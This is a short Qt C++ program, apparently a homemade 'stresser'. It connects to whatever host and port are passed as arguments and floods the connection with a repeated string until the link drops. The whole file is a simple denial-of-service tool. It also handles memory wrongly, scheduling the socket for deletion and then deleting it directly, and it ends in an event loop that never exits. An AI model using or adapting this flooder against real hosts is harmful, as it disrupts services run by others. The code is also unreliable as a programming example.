#include <QCoreApplication>
#include <QDebug>
#include <QString>
#include <QTcpSocket>
#include <cstdlib>

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    qDebug() << argv[1] << " " << argv[2];

    QTcpSocket *socket = new QTcpSocket();

    socket->connectToHost(argv[1], std::atoi(argv[2]), QIODevice::ReadWrite, QAbstractSocket::IPv4Protocol);



    if(socket -> waitForConnected(10000)){
        QByteArray data = "dih onion stressera";
        while(socket->state() == QAbstractSocket::ConnectedState) {
            socket->write(data);

            if (!socket->waitForBytesWritten(1000)) {
                break;
            }
        }
    } else{
        qDebug() << "Błąd połączenia TCP: " << socket->errorString();
    }
    socket->deleteLater();
    delete socket;

    return QCoreApplication::exec();
}
